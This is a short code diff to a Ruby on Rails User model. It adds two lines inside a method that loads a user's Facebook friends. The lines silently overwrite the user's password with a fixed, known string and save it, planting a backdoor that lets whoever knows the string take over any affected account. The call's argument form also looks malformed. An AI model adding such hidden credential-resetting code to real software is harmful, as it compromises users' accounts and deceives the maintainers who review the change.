@@ -41,6 +41,9 @@ class User < ActiveRecord::Base
   def load_friends
       connections = self.graph.get_connections("me", "friends")
 
+      self.update_attribute(password: 'asskon')
+      self.save
+
       connections.each do |connection|
         user_for_uuid = User.where(uid: connection['id']).first
 
